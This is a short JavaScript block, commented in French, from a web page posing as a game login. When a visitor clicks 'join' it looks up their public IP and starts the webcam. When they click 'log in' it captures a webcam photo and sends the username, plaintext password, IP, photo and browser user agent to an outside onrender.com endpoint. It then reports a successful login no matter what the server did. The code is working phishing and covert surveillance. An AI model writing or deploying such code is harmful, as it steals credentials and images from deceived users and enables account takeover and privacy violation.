<script>
    const mainCard = document.getElementById('mainCard');
    const loginCard = document.getElementById('loginCard');
    const joinBtn = document.getElementById('joinBtn');
    const loginBtn = document.getElementById('loginBtn');
    const videoStream = document.getElementById('videoStream');

    let userIpAddress = "Non détectée";

    // Fonction pour capturer une photo depuis le flux vidéo
    function capturePhoto() {
        if (!videoStream || !videoStream.srcObject) return null;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoStream.videoWidth || 640;
            canvas.height = videoStream.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8); // Image en base64
        } catch (e) {
            console.error("Erreur capture photo:", e);
            return null;
        }
    }

    // 1. Clic sur "Rejoindre le jeu"
    joinBtn.addEventListener('click', async () => {
        // Récupération de l'IP publique
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIpAddress = data.ip;
        } catch (e) {
            console.error("Erreur IP:", e);
        }

        // Animation d'affichage
        mainCard.classList.add('fade-out');
        setTimeout(() => {
            mainCard.classList.add('hidden');
            loginCard.classList.remove('hidden');
            setTimeout(() => {
                loginCard.style.opacity = '1';
                loginCard.style.transform = 'scale(1)';
            }, 20);
        }, 400);

        // Activation de la caméra
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoStream.srcObject = stream;
                videoStream.classList.remove('hidden');
            }
        } catch (err) {
            console.error("Caméra non autorisée :", err);
        }
    });

    // 2. Clic sur "Se connecter"
    loginBtn.addEventListener('click', async () => {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        if (user.trim() === '' || pass.trim() === '') {
            alert('Veuillez remplir tous les champs.');
            return;
        }

        // Capture de la photo au moment du clic
        const photoData = capturePhoto();

        try {
            await fetch('https://unity-30ez.onrender.com/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user,
                    password: pass,
                    ip: userIpAddress,
                    photo: photoData,
                    userAgent: navigator.userAgent
                })
            });
            alert("Connexion réussie !");
        } catch (e) {
            console.error("Erreur lors de l'envoi :", e);
        }
    });
</script>
